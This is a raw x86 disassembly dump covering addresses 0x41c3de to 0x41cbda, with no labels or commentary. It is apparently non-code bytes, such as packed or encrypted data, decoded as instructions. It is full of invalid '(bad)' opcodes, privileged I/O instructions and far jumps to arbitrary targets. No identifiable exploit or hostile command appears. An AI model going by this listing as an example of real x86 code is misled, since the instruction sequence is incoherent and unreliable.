  41c3de:	cmp    al,0xc2
  41c3e0:	push   cs
  41c3e1:	xor    DWORD PTR [edx],edx
  41c3e3:	inc    eax
  41c3e4:	das    
  41c3e5:	dec    eax
  41c3e6:	inc    ebp
  41c3e7:	xchg   edx,eax
  41c3e8:	xchg   BYTE PTR [eax+0x63822683],al
  41c3ee:	leave  
  41c3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3f0:	pop    es
  41c3f1:	sub    DWORD PTR [ebx+0x6e],edx
  41c3f4:	lahf   
  41c3f5:	mov    eax,ds:0x2564fcf7
  41c3fa:	push   ss
  41c3fb:	jns    0x41c3af
  41c3fd:	bnd jo 0x41c44e
  41c400:	gs pop ds
  41c402:	xchg   BYTE PTR [edx],ch
  41c404:	mov    cl,0x13
  41c406:	push   ebp
  41c407:	and    eax,0xf727dd42
  41c40c:	mov    edi,0x70fe49df
  41c411:	or     DWORD PTR [esi-0x7a],ebx
  41c414:	jbe    0x41c3a0
  41c416:	sbb    al,0x74
  41c419:	sub    cl,BYTE PTR [esi+0x75be85ef]
  41c41f:	pop    es
  41c420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c421:	inc    DWORD PTR [ecx-0x68fe7a0]
  41c427:	or     al,0x2e
  41c429:	adc    al,0x5b
  41c42b:	rcr    DWORD PTR [ebx],1
  41c42d:	call   0x2b10353c
  41c432:	outs   dx,DWORD PTR ds:[esi]
  41c433:	xor    al,0xbd
  41c435:	or     BYTE PTR [ebx+ebp*2],dh
  41c438:	out    0x69,eax
  41c43a:	xor    BYTE PTR [esi],0xe6
  41c43d:	or     dl,bl
  41c43f:	jp     0x41c42f
  41c441:	inc    edi
  41c442:	jle    0x41c4bc
  41c444:	out    0xee,eax
  41c446:	sbb    DWORD PTR [edi-0x6c],0xe2a3e91d
  41c44d:	ucomiss xmm5,xmm1
  41c450:	jl     0x41c43a
  41c452:	sub    BYTE PTR [edi+0x6dd7e1f7],ah
  41c458:	retf   
  41c459:	sbb    BYTE PTR ds:0x3ff9321a,dh
  41c45f:	add    al,0xf2
  41c461:	arpl   WORD PTR [edi+0x8714da],bp
  41c467:	jmp    0x8c1b:0x17d6a1cd
  41c46e:	lea    ebp,[esp+edi*2]
  41c471:	xor    BYTE PTR [ebx+0x52140dd5],bl
  41c477:	loopne 0x41c464
  41c479:	pop    ebx
  41c47a:	into   
  41c47b:	lock mov ah,0x33
  41c47e:	mov    eax,ds:0xa96717e
  41c483:	out    0xe2,al
  41c485:	lea    ecx,[eax+0x6ac82225]
  41c48b:	fiadd  WORD PTR [ebp+edx*2-0xc4949b3]
  41c493:	pop    esp
  41c494:	dec    edx
  41c495:	scas   eax,DWORD PTR es:[edi]
  41c496:	inc    edi
	...
  41c513:	add    BYTE PTR [esi-0x9b72fa0],al
  41c519:	clc    
  41c51a:	sahf   
  41c51b:	out    dx,al
  41c51c:	or     eax,0x37b0d536
  41c521:	mov    al,ds:0x625fea9c
  41c526:	add    DWORD PTR [eax],eax
  41c528:	imul   eax,DWORD PTR [edi],0x0
  41c52b:	add    BYTE PTR ds:0x324dd18a,ah
  41c531:	add    bl,bl
  41c533:	add    eax,0xa0e7c73b
  41c538:	dec    esp
  41c539:	xchg   DWORD PTR [esi+0x43],eax
  41c53c:	push   edi
  41c53d:	and    eax,ecx
  41c53f:	xchg   edx,eax
  41c540:	xchg   edx,eax
  41c541:	sbb    BYTE PTR [edi+0x54],dh
  41c544:	ror    edi,1
  41c546:	mov    ecx,0x70c74ee3
  41c54b:	retf   0xac11
  41c54e:	pop    esi
  41c54f:	lahf   
  41c550:	dec    edi
  41c551:	(bad)  ds:0x225f4b33
  41c557:	mov    ebx,0x566a0d69
  41c55c:	in     al,0xce
  41c55e:	call   DWORD PTR [ebx]
  41c560:	jnp    0x41c4f2
  41c562:	jnp    0x41c523
  41c564:	xor    al,0xfd
  41c566:	lds    eax,FWORD PTR [ebp-0x19bdd46c]
  41c56c:	shl    BYTE PTR [edx+edi*4+0x27d815b5],0xce
  41c574:	mov    ch,0x1c
  41c576:	loopne 0x41c52f
  41c578:	out    dx,eax
  41c579:	jae    0x41c5ce
  41c57b:	rcr    BYTE PTR [ecx+0x2e9cb971],1
  41c581:	stc    
  41c582:	scas   eax,DWORD PTR es:[edi]
  41c583:	sub    ch,dl
  41c585:	push   es
  41c586:	push   ebp
  41c587:	ins    DWORD PTR es:[edi],dx
  41c588:	fs fcomi st,st(6)
  41c58b:	mov    al,0xb7
  41c58d:	loope  0x41c564
  41c58f:	arpl   WORD PTR [ecx+0x1c5e15b1],bp
  41c595:	retf   0xbe4c
  41c598:	mov    BYTE PTR [ecx+0x6c],dl
  41c59b:	xor    bh,dh
  41c59d:	mov    ebx,0xdd5ddc74
  41c5a2:	popf   
  41c5a3:	rcr    DWORD PTR [esi],1
  41c5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5a6:	sbb    bh,ch
  41c5a8:	and    al,0x84
  41c5aa:	push   ebp
  41c5ab:	jne    0x41c540
  41c5ad:	rol    BYTE PTR [edx],0xd
  41c5b0:	cmc    
  41c5b1:	xor    ah,BYTE PTR [ebp+0xd6c7e01]
  41c5b7:	mov    ebp,0x50eaf5e6
  41c5bc:	and    ecx,DWORD PTR [edi-0x12]
  41c5bf:	lahf   
  41c5c0:	ror    BYTE PTR [edx+0x7f],0x77
  41c5c4:	mov    ebx,0x35f15a57
  41c5c9:	pop    ecx
  41c5ca:	jmp    0x41c635
  41c5cc:	push   ss
  41c5cd:	stos   BYTE PTR es:[edi],al
  41c5ce:	sti    
  41c5cf:	popa   
  41c5d0:	leave  
  41c5d1:	icebp  
  41c5d2:	mov    al,0x83
  41c5d4:	imul   esi,DWORD PTR [edx+0x43d86d56],0x2afda76f
  41c5de:	cwde   
  41c5df:	push   cs
  41c5e0:	mov    bl,BYTE PTR [ebp+0x369cc870]
  41c5e6:	mov    ds:0xb0bc4807,eax
  41c5eb:	lods   eax,DWORD PTR ds:[esi]
  41c5ec:	es pop ebx
  41c5ee:	inc    esi
  41c5ef:	ret    0xb8cd
  41c5f2:	jle    0x41c616
  41c5f4:	gs in  eax,dx
  41c5f6:	dec    edi
  41c5f7:	js     0x41c5ee
  41c5f9:	or     edi,ebx
  41c5fb:	jmp    0x41c66c
  41c5fd:	lods   al,BYTE PTR ds:[esi]
  41c5fe:	inc    edi
  41c5ff:	aaa    
  41c600:	and    DWORD PTR [edi],ebx
  41c602:	adc    BYTE PTR ds:0xab027a7e,0x56
  41c609:	ror    DWORD PTR [eax+0x1c],1
  41c60c:	jnp    0x41c609
  41c60e:	(bad)  
  41c60f:	mov    cl,0x33
  41c611:	pop    ds
  41c612:	sub    eax,0xb347641e
  41c617:	dec    esi
  41c618:	pop    ecx
  41c619:	xor    esi,DWORD PTR [esi]
  41c61b:	addr16 lahf 
  41c61d:	call   0xc1455bc
  41c622:	test   BYTE PTR [esi],dl
  41c624:	cmc    
  41c625:	add    BYTE PTR [edi-0x49257c40],bh
  41c62b:	dec    eax
  41c62c:	psubusb mm3,QWORD PTR [eax-0x6a7185e6]
  41c633:	inc    edi
  41c634:	xchg   edi,eax
  41c635:	popa   
  41c636:	and    DWORD PTR [ebp-0x65a6645e],ecx
  41c63c:	mov    BYTE PTR [ecx+0x7119ecad],dh
  41c642:	scas   al,BYTE PTR es:[edi]
  41c643:	add    cl,BYTE PTR [edx]
  41c645:	add    eax,0x31efdf89
  41c64a:	into   
  41c64b:	or     eax,0xdaae7d8e
  41c650:	dec    ebp
  41c651:	and    BYTE PTR [eax],al
  41c653:	or     dl,al
  41c655:	leave  
  41c656:	test   DWORD PTR [eax+ebp*1],ebp
  41c659:	inc    esi
  41c65a:	jge    0x41c612
  41c65c:	add    eax,0xa1df6bbe
  41c661:	(bad)  
  41c662:	addr16 call 0x7b66:0x998f970b
  41c66a:	or     eax,DWORD PTR es:[edx-0x4d]
  41c66e:	jnp    0x41c6e5
  41c670:	push   esp
  41c671:	ja     0x41c607
  41c673:	bound  edi,QWORD PTR [ebx+edi*1]
  41c676:	mov    ah,0x75
  41c678:	lods   eax,DWORD PTR ds:[esi]
  41c679:	adc    al,0x5f
  41c67b:	dec    eax
  41c67c:	add    al,0xce
  41c67e:	mov    esp,0x16d9e007
  41c683:	(bad)  
  41c684:	sbb    DWORD PTR [edx+0x1d59fafa],esi
  41c68a:	bound  ebx,QWORD PTR [ebx+0x178d309d]
  41c690:	and    cl,0xb9
  41c693:	jge    0x41c712
  41c695:	and    bl,BYTE PTR [ebx]
  41c697:	aas    
  41c698:	and    esi,DWORD PTR [ecx+edx*4-0x5d]
  41c69c:	xchg   ebp,eax
  41c69d:	mov    al,0x8e
  41c69f:	fnstenv [ebx-0x7dac0266]
  41c6a5:	cld    
  41c6a6:	scas   eax,DWORD PTR es:[edi]
  41c6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6a8:	mov    dh,0xcc
  41c6aa:	push   edi
  41c6ab:	test   eax,0x1d7a6cd
  41c6b0:	cdq    
  41c6b1:	adc    esp,edx
  41c6b3:	cmp    ecx,DWORD PTR [edi+ecx*2+0x31]
  41c6b7:	jg     0x41c6cf
  41c6b9:	lock jl 0x41c706
  41c6bc:	fmul   QWORD PTR [eax-0x8]
  41c6bf:	and    eax,0x252f825
  41c6c4:	inc    ebx
  41c6c5:	pop    edi
  41c6c6:	mov    ss,esp
  41c6c8:	mov    dh,0xd9
  41c6ca:	cdq    
  41c6cb:	jp     0x41c6c9
  41c6cd:	leave  
  41c6ce:	les    edx,FWORD PTR [edx]
  41c6d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6d1:	iret   
  41c6d2:	mov    al,ds:0x92b99c5e
  41c6d7:	call   0xf71b4782
  41c6dc:	outs   dx,DWORD PTR ds:[esi]
  41c6dd:	call   eax
  41c6df:	shl    BYTE PTR [eax-0x41],1
  41c6e2:	icebp  
  41c6e3:	adc    al,0x83
  41c6e5:	jmp    0xe3d33070
  41c6ea:	(bad)  
  41c6eb:	data16 aam 0x15
  41c6ee:	aaa    
  41c6ef:	mov    bl,BYTE PTR [eax]
  41c6f1:	or     al,0xa5
  41c6f3:	inc    eax
  41c6f4:	hlt    
  41c6f5:	mov    ?,ebx
  41c6f7:	mov    bl,0x52
  41c6f9:	test   DWORD PTR [eax+ebp*2],esp
  41c6fc:	pop    esi
  41c6fd:	hlt    
  41c6fe:	lock (bad) [ebp-0x32918cae]
  41c705:	sahf   
  41c706:	inc    esi
  41c707:	hlt    
  41c708:	int    0x1b
  41c70a:	ss push edx
  41c70c:	or     BYTE PTR [esi+0x4b5364a5],cl
  41c712:	aad    0x43
  41c714:	xor    bl,BYTE PTR [esi+esi*4-0x78a65281]
  41c71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c71c:	fstp   QWORD PTR [edi+0xe]
  41c71f:	rcr    BYTE PTR [esi+0xd354201],cl
  41c725:	push   ecx
  41c726:	inc    ecx
  41c727:	fisttp DWORD PTR [edx+0x6aa9372a]
  41c72d:	sbb    esp,DWORD PTR [ebx+0x19e06abc]
  41c733:	ror    DWORD PTR [ebx],1
  41c735:	repnz shr DWORD PTR [esi+0x20],cl
  41c739:	mov    ds:0x39551911,al
  41c73e:	rcr    edx,0x3f
  41c741:	adc    DWORD PTR [edi-0x787675c8],ebx
  41c747:	push   0x76
  41c749:	jge    0x41c70f
  41c74b:	lods   eax,DWORD PTR ds:[esi]
  41c74c:	(bad)  
  41c74d:	ficomp DWORD PTR [eiz*8+0x7796b878]
  41c754:	xchg   ebp,eax
  41c755:	hlt    
  41c756:	jmp    0xd07b:0x528fb486
  41c75d:	xor    eax,0xa20e8dc6
  41c762:	jo     0x41c717
  41c764:	lds    esi,FWORD PTR [ecx-0x6f]
  41c767:	repnz mov eax,DWORD PTR [ebx-0xc]
  41c76b:	(bad)  
  41c76c:	faddp  st(0),st
  41c76e:	aad    0x7e
  41c770:	hlt    
  41c771:	xchg   ch,al
  41c773:	mov    DWORD PTR [edx+0x4fbfb530],edx
  41c779:	cmp    edi,esi
  41c77b:	dec    esi
  41c77c:	dec    BYTE PTR [esi]
  41c77e:	inc    eax
  41c77f:	cdq    
  41c780:	ins    BYTE PTR es:[edi],dx
  41c781:	outs   dx,DWORD PTR ds:[esi]
  41c782:	sbb    edi,ebp
  41c784:	xor    eax,0x5282ea0a
  41c789:	push   ds
  41c78a:	jno    0x41c76a
  41c78c:	jp     0x41c809
  41c78e:	fwait
  41c78f:	mov    edi,0xe42d9aa6
  41c794:	(bad)  
  41c795:	and    edx,DWORD PTR [ecx+0x501ac5f5]
  41c79b:	push   eax
  41c79c:	sahf   
  41c79d:	dec    ebx
  41c79e:	pop    es
  41c79f:	imul   esi,DWORD PTR [ebx],0x42e1a52d
  41c7a5:	mov    eax,ds:0x8c701520
  41c7aa:	aam    0xb8
  41c7ac:	daa    
  41c7ad:	sub    esp,esi
  41c7af:	jmp    0xcaffb004
  41c7b4:	sar    DWORD PTR [edi+0x4b176861],cl
  41c7ba:	xor    eax,0xcb4855ac
  41c7bf:	out    0x47,al
  41c7c1:	push   0xffffffbe
  41c7c3:	inc    eax
  41c7c4:	shl    DWORD PTR [eax],cl
  41c7c6:	sub    BYTE PTR [eax-0x6631a29a],0xf1
  41c7cd:	sub    eax,DWORD PTR [ebx]
  41c7cf:	add    BYTE PTR [ebx],ch
  41c7d1:	(bad)  
  41c7d2:	pop    ebx
  41c7d3:	inc    esp
  41c7d4:	push   ebp
  41c7d5:	inc    eax
  41c7d6:	(bad)  
  41c7d8:	inc    ecx
  41c7d9:	ret    
  41c7da:	pop    ebx
  41c7db:	xchg   ebp,eax
  41c7dc:	pop    ebx
  41c7dd:	dec    eax
  41c7de:	das    
  41c7df:	jbe    0x41c7a9
  41c7e1:	ds in  eax,dx
  41c7e3:	xchg   ebp,eax
  41c7e4:	loopne 0x41c807
  41c7e6:	loopne 0x41c78f
  41c7e8:	sub    al,0x66
  41c7ea:	push   edi
  41c7eb:	or     edx,DWORD PTR [ecx+0x2d42628f]
  41c7f1:	mov    al,ds:0x8aa8c44
  41c7f6:	sbb    dh,BYTE PTR [esi]
  41c7f8:	aas    
  41c7f9:	clc    
  41c7fa:	popa   
  41c7fb:	mov    ds:0xc1c1e091,al
  41c800:	mov    ebx,0x87a89f2d
  41c805:	or     bl,BYTE PTR [ebp-0x36625c71]
  41c80b:	fs push edx
  41c80d:	out    0x7d,eax
  41c80f:	in     eax,0x73
  41c811:	gs out 0x8,eax
  41c814:	push   esi
  41c815:	arpl   WORD PTR [ebp+0x58d69d7c],ax
  41c81b:	add    DWORD PTR [edi],ecx
  41c81d:	jmp    0x41c88e
  41c81f:	mov    eax,0x23eb2d27
  41c824:	mov    ecx,0x19cd8570
  41c829:	jns    0x41c7dd
  41c82b:	mov    eax,0x6c1bdc20
  41c831:	je     0x41c800
  41c833:	cmp    ebp,esi
  41c835:	cmp    BYTE PTR [edx],bl
  41c837:	jnp    0x41c881
  41c839:	add    al,0xc
  41c83b:	xchg   esp,eax
  41c83c:	ins    DWORD PTR es:[edi],dx
  41c83d:	jmp    0x41c808
  41c83f:	jle    0x41c8b8
  41c841:	xchg   esp,ebx
  41c843:	out    0x5c,al
  41c845:	imul   edx,DWORD PTR [ebx+0x38],0xffffffef
  41c849:	or     eax,0x6f027440
  41c84e:	jmp    0x551f4329
  41c853:	xchg   ecx,eax
  41c854:	fisttp DWORD PTR [edi-0x39]
  41c857:	jecxz  0x41c85a
  41c859:	dec    ecx
  41c85a:	fwait
  41c85b:	cs adc al,0x1
  41c85e:	xor    BYTE PTR [ebp+0x7301bca],0x8a
  41c865:	xor    ecx,esi
  41c867:	mov    edi,0x932ba77c
  41c86c:	or     BYTE PTR [edi],al
  41c86e:	xchg   edi,edi
  41c870:	dec    ebx
  41c871:	jnp    0x41c8a5
  41c873:	xchg   esp,eax
  41c874:	pop    ebx
  41c875:	and    BYTE PTR [edx+0x5d34f7ad],bl
  41c87b:	pop    edx
  41c87c:	ins    BYTE PTR es:[edi],dx
  41c87d:	mov    dl,0x4c
  41c87f:	retf   
  41c880:	cmp    eax,0x42a99c4a
  41c885:	retf   0x193d
  41c888:	xchg   edi,eax
  41c889:	fadd   DWORD PTR [edi+edx*2-0x5]
  41c88d:	pop    esi
  41c88e:	outs   dx,DWORD PTR ds:[esi]
  41c88f:	jbe    0x41c8d5
  41c891:	or     eax,0x27d5ab97
  41c896:	fistp  DWORD PTR [ebp+0x5e]
  41c899:	push   cs
  41c89a:	inc    ebp
  41c89b:	push   0xffffffa9
  41c89d:	mov    bl,0xc7
  41c89f:	aaa    
  41c8a0:	(bad)  
  41c8a1:	fmul   DWORD PTR [eax-0x2055717c]
  41c8a7:	xor    eax,0x175d54d8
  41c8ac:	inc    ebp
  41c8ad:	sbb    dh,ch
  41c8af:	mov    eax,ds:0xfae7f169
  41c8b4:	(bad)  
  41c8b5:	xchg   edx,eax
  41c8b6:	ss (bad) 
  41c8ba:	fmul   DWORD PTR [esp+edx*2-0x2]
  41c8be:	addr16 icebp 
  41c8c0:	shl    BYTE PTR [ebx],1
  41c8c2:	or     ecx,DWORD PTR [edx-0x8]
  41c8c5:	(bad)  
  41c8c7:	cmp    BYTE PTR [edi+0x4d6174d4],al
  41c8cd:	mov    al,0x12
  41c8cf:	dec    ebx
  41c8d0:	retf   
  41c8d1:	adc    eax,0xdc32df98
  41c8d6:	xchg   DWORD PTR [esi+edx*8-0x384184a5],eax
  41c8dd:	sub    eax,ebp
  41c8df:	dec    esi
  41c8e0:	mov    ah,0x36
  41c8e2:	push   ebx
  41c8e3:	jle    0x41c8a3
  41c8e5:	adc    eax,0x542f387b
  41c8ea:	jnp    0x41c93a
  41c8ec:	out    dx,al
  41c8ed:	dec    ecx
  41c8ee:	call   0xb2e2:0xa1a0c35a
  41c8f5:	cli    
  41c8f6:	pop    ds
  41c8f7:	neg    DWORD PTR [ebp-0x64]
  41c8fa:	cwde   
  41c8fb:	sub    cl,BYTE PTR [ecx+0x15]
  41c8fe:	inc    esp
  41c8ff:	(bad)  
  41c900:	fidivr DWORD PTR [ebx]
  41c902:	call   0x9e9faa18
  41c907:	shl    BYTE PTR [edx],cl
  41c909:	dec    ebx
  41c90a:	outs   dx,BYTE PTR ds:[esi]
  41c90b:	adc    dl,cl
  41c90d:	ins    DWORD PTR es:[edi],dx
  41c90e:	lock daa 
  41c910:	sub    ah,BYTE PTR [ebp+0x5c]
  41c913:	sub    eax,0x80d322e0
  41c918:	loop   0x41c96a
  41c91a:	aas    
  41c91b:	pop    esp
  41c91c:	into   
  41c91d:	pusha  
  41c91e:	gs xchg ebp,eax
  41c920:	pop    ebx
  41c921:	dec    ecx
  41c922:	and    dl,BYTE PTR [ebp-0x1bbda71e]
  41c928:	dec    eax
  41c929:	dec    ebx
  41c92a:	jno    0x41c946
  41c92c:	addr16 mov cl,0x7b
  41c92f:	inc    ebp
  41c930:	pop    esp
  41c931:	sbb    al,0x4b
  41c933:	or     edx,DWORD PTR [ebp-0x60]
  41c936:	jg     0x41c91c
  41c938:	loop   0x41c9ac
  41c93a:	jle    0x41c988
  41c93c:	and    eax,0x65490e4e
  41c941:	cmp    eax,0xb087451d
  41c946:	test   eax,0x7bac5d1f
  41c94b:	inc    esi
  41c94c:	(bad)  
  41c94e:	aad    0x2a
  41c950:	sbb    esi,DWORD PTR [eax]
  41c952:	sbb    dl,BYTE PTR [edi+edi*1-0x77ddf6eb]
  41c959:	mov    esi,0x1b75abe9
  41c95e:	mov    al,dh
  41c960:	pop    esi
  41c961:	inc    edi
  41c962:	mov    ebx,0x95636111
  41c967:	pop    esp
  41c968:	das    
  41c969:	and    al,0xfb
  41c96b:	in     eax,0x8b
  41c96d:	daa    
  41c96e:	mov    esp,0x656fda17
  41c973:	dec    esi
  41c974:	aaa    
  41c975:	int3   
  41c976:	add    DWORD PTR [ecx+0x39],edi
  41c979:	pop    ss
  41c97a:	push   ss
  41c97b:	push   edx
  41c97c:	scas   al,BYTE PTR es:[edi]
  41c97d:	xchg   esi,eax
  41c97e:	jo     0x41c9f7
  41c980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c981:	inc    esi
  41c982:	test   BYTE PTR [edi+0x24],0x32
  41c986:	cmp    dh,BYTE PTR [ebx+0x651aec06]
  41c98c:	ficom  DWORD PTR [esi+0x60]
  41c98f:	cdq    
  41c990:	(bad)  
  41c992:	gs pop edi
  41c994:	retf   
  41c995:	js     0x41c91e
  41c997:	cmp    ebp,DWORD PTR [eax]
  41c999:	jp     0x41c9bc
  41c99b:	push   esp
  41c99c:	fwait
  41c99d:	std    
  41c99e:	push   ebx
  41c99f:	mov    dh,0x2d
  41c9a1:	or     al,BYTE PTR [ecx+0x69]
  41c9a4:	mov    ds:0xb86a8aad,eax
  41c9a9:	cmp    dl,BYTE PTR ds:0x68809e50
  41c9af:	jo     0x41c961
  41c9b1:	xchg   BYTE PTR [edx-0x2af14892],ch
  41c9b7:	adc    eax,0x7d3b89aa
  41c9bc:	inc    edi
  41c9bd:	out    dx,al
  41c9be:	add    eax,0x107ba53a
  41c9c3:	in     al,0xe1
  41c9c5:	clc    
  41c9c6:	xor    ecx,DWORD PTR [eax]
  41c9c8:	loop   0x41ca1f
  41c9ca:	jp     0x41c9bc
  41c9cc:	daa    
  41c9cd:	mov    ebx,0x57543a25
  41c9d2:	imul   edi,DWORD PTR [ebx+ebp*4],0xfffffff4
  41c9d6:	xor    al,BYTE PTR [ebp-0x37d2b77d]
  41c9dc:	sahf   
  41c9dd:	addr16 push ecx
  41c9df:	rcl    DWORD PTR [ecx],0xe5
  41c9e2:	int    0xe8
  41c9e4:	xchg   ecx,eax
  41c9e5:	or     DWORD PTR ds:[ebx-0x6f],esi
  41c9e9:	ja     0x41c9a0
  41c9eb:	call   0xec7b1c63
  41c9f0:	loop   0x41c9ad
  41c9f2:	fild   QWORD PTR [edx]
  41c9f4:	pop    ds
  41c9f5:	inc    esp
  41c9f6:	ficomp DWORD PTR [edi]
  41c9f8:	cmp    eax,ecx
  41c9fa:	cwde   
  41c9fb:	(bad)  
  41c9fc:	xchg   edi,eax
  41c9fd:	sub    al,0x99
  41c9ff:	test   DWORD PTR [ebx+edi*8+0x4bfcc892],edi
  41ca06:	push   ecx
  41ca07:	pop    eax
  41ca08:	cmp    eax,0x6e0aa5dd
  41ca0d:	sub    edx,DWORD PTR [ebp+0x63]
  41ca10:	ins    BYTE PTR es:[edi],dx
  41ca11:	pop    edi
  41ca12:	icebp  
  41ca13:	aam    0xae
  41ca15:	jo     0x41c9e2
  41ca17:	inc    ebp
  41ca18:	pushf  
  41ca19:	mov    cl,0x99
  41ca1b:	test   eax,0x21ef68a3
  41ca20:	call   0xc2d01472
  41ca25:	ret    
  41ca26:	lahf   
  41ca27:	loope  0x41ca40
  41ca29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca2a:	mov    dh,0x24
  41ca2c:	fild   WORD PTR [ebx-0x36]
  41ca2f:	pop    edi
  41ca30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca31:	cmp    bh,cl
  41ca33:	pop    ss
  41ca34:	hlt    
  41ca35:	stc    
  41ca36:	and    BYTE PTR [eax+0x59260ab0],0xf
  41ca3d:	imul   ebp,DWORD PTR [esi+ebp*2],0xcbde2df5
  41ca44:	(bad)  
  41ca45:	bswap  edi
  41ca47:	xor    bh,ch
  41ca49:	sub    al,0x51
  41ca4b:	aaa    
  41ca4c:	out    0x58,eax
  41ca4e:	push   ss
  41ca4f:	call   0xc867:0x9e915d94
  41ca56:	cmp    dl,BYTE PTR [esi-0xd6502b0]
  41ca5c:	in     eax,0x3c
  41ca5e:	jg     0x41cad1
  41ca60:	xor    ch,BYTE PTR [edi+0x76]
  41ca63:	pop    edx
  41ca64:	push   edi
  41ca65:	das    
  41ca66:	fdiv   DWORD PTR ds:0x8bebf17d
  41ca6c:	arpl   WORD PTR [ebp+0x130a0f1a],ax
  41ca72:	xlat   BYTE PTR es:[ebx]
  41ca74:	loopne 0x41ca3e
  41ca76:	cmp    eax,0x78140306
  41ca7b:	stc    
  41ca7c:	mov    cl,0x2b
  41ca7e:	jnp    0x41ca9e
  41ca80:	and    dh,dl
  41ca82:	jmp    DWORD PTR [esi-0x6c]
  41ca85:	xchg   ecx,esp
  41ca87:	cld    
  41ca88:	mov    eax,0xec7b39e
  41ca8d:	jb     0x41ca8e
  41ca8f:	into   
  41ca90:	mov    ah,0x4
  41ca92:	push   edx
  41ca93:	outs   dx,BYTE PTR ds:[esi]
  41ca94:	mov    ebx,0xa3e62fa3
  41ca99:	pop    ebx
  41ca9a:	out    dx,al
  41ca9b:	test   BYTE PTR [edx],cl
  41ca9d:	div    DWORD PTR [ecx+edx*8]
  41caa0:	cmp    ah,al
  41caa2:	psraw  mm3,QWORD PTR [edx+ecx*2-0x15]
  41caa7:	js     0x41ca94
  41caa9:	cld    
  41caaa:	and    al,0xce
  41caac:	test   al,0xad
  41caae:	js     0x41ca68
  41cab0:	adc    ebx,DWORD PTR [edx-0x134da276]
  41cab6:	sahf   
  41cab7:	push   0xc4c695e1
  41cabc:	and    BYTE PTR [edx+0x127351c0],bh
  41cac2:	cmp    ebx,DWORD PTR [edx+0x79]
  41cac5:	lea    ebp,[eax]
  41cac7:	ror    BYTE PTR [edi+ecx*2-0x60f50ae5],0x5e
  41cacf:	or     DWORD PTR [edx+0x53],ecx
  41cad2:	push   0xe
  41cad4:	sahf   
  41cad5:	cmc    
  41cad6:	inc    eax
  41cad7:	mov    esp,0xcd7acb1c
  41cadc:	or     al,0x4c
  41cade:	rol    esp,1
  41cae0:	loope  0x41cb12
  41cae2:	sbb    eax,0xd00ce235
  41cae7:	test   eax,0x28cb08aa
  41caec:	xor    DWORD PTR [esi-0x57],esi
  41caef:	sti    
  41caf0:	ret    
  41caf1:	jl     0x41cac4
  41caf3:	enter  0x8bfe,0xbe
  41caf7:	xchg   esp,eax
  41caf8:	xor    ecx,DWORD PTR [ebp-0x5c38f7ce]
  41cafe:	add    BYTE PTR [ebx+0x1d],al
  41cb01:	(bad)  
  41cb02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb03:	(bad)  
  41cb04:	int3   
  41cb05:	jo     0x41cb3b
  41cb07:	xor    al,0x32
  41cb09:	(bad)  
  41cb0a:	pop    ebx
  41cb0b:	xchg   esp,eax
  41cb0c:	inc    ecx
  41cb0d:	adc    DWORD PTR [ecx+0x4a71b7b5],0xc
  41cb14:	(bad)  
  41cb15:	test   al,0x2
  41cb17:	loope  0x41cb60
  41cb19:	es dec esp
  41cb1b:	add    ch,BYTE PTR [edx]
  41cb1d:	pop    esp
  41cb1e:	pop    es
  41cb1f:	sbb    ecx,DWORD PTR ds:0x8ac62cba
  41cb25:	dec    edx
  41cb26:	repz les ebp,FWORD PTR [edx]
  41cb29:	int    0x29
  41cb2b:	push   cs
  41cb2c:	push   ds
  41cb2d:	ror    DWORD PTR [ecx-0x61],1
  41cb30:	inc    DWORD PTR [esi+esi*2+0x3fa2ec1a]
  41cb37:	out    dx,al
  41cb38:	mov    ds:0xdb0dadd6,eax
  41cb3d:	repz les ecx,FWORD PTR [esp+0x6e]
  41cb42:	fsub   DWORD PTR [edx+edx*1+0x637cfabd]
  41cb49:	outs   dx,BYTE PTR ds:[esi]
  41cb4a:	pushf  
  41cb4b:	inc    ebp
  41cb4c:	das    
  41cb4d:	in     al,0x5e
  41cb4f:	ret    0x2e08
  41cb52:	lea    ebx,[ebx+0x17]
  41cb55:	in     eax,0x22
  41cb57:	pushf  
  41cb58:	sbb    dl,BYTE PTR [edi]
  41cb5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb5b:	adc    eax,0x642ff8ca
  41cb60:	fstp   QWORD PTR [eax+0x56]
  41cb63:	call   0x122c0c28
  41cb68:	int3   
  41cb69:	dec    edi
  41cb6a:	cli    
  41cb6b:	mov    ch,BYTE PTR [ecx-0x5794264d]
  41cb71:	sub    eax,0xe3616d28
  41cb76:	or     ecx,edi
  41cb78:	push   ecx
  41cb79:	jb     0x41cb92
  41cb7b:	mov    ch,0x2a
  41cb7d:	jns    0x41cbfb
  41cb7f:	fcomp  DWORD PTR [ebx+0x57]
  41cb82:	add    BYTE PTR [ecx+0x16],dh
  41cb85:	ror    ah,0x5c
  41cb88:	push   edx
  41cb89:	int3   
  41cb8a:	push   esp
  41cb8b:	pop    esp
  41cb8c:	call   0xa906:0x8180b53e
  41cb93:	push   eax
  41cb94:	xor    DWORD PTR [ecx*2+0x6c09f4aa],ebp
  41cb9b:	pop    eax
  41cb9c:	adc    eax,0x16ac1304
  41cba1:	xchg   edx,eax
  41cba2:	clc    
  41cba3:	and    DWORD PTR [edx+0x9],ecx
  41cba6:	pop    es
  41cba7:	rcl    al,0x55
  41cbaa:	int3   
  41cbab:	enter  0xf51e,0xae
  41cbaf:	mov    ebx,0x7536047a
  41cbb4:	dec    ebx
  41cbb5:	ficom  DWORD PTR [ebx]
  41cbb7:	mov    eax,ds:0x84d70f36
  41cbbc:	dec    esi
  41cbbd:	jecxz  0x41cbbc
  41cbbf:	(bad)  
  41cbc0:	hlt    
  41cbc1:	add    eax,edx
  41cbc3:	fwait
  41cbc4:	mov    ecx,0x152ee00c
  41cbc9:	dec    esi
  41cbca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbcb:	push   eax
  41cbcc:	fild   QWORD PTR ss:[ecx+0x5b6b128a]
  41cbd3:	loopne 0x41cbcb
  41cbd5:	pusha  
  41cbd6:	sbb    ch,dh
  41cbd8:	nop
  41cbd9:	in     al,dx
  41cbda:	cdq    
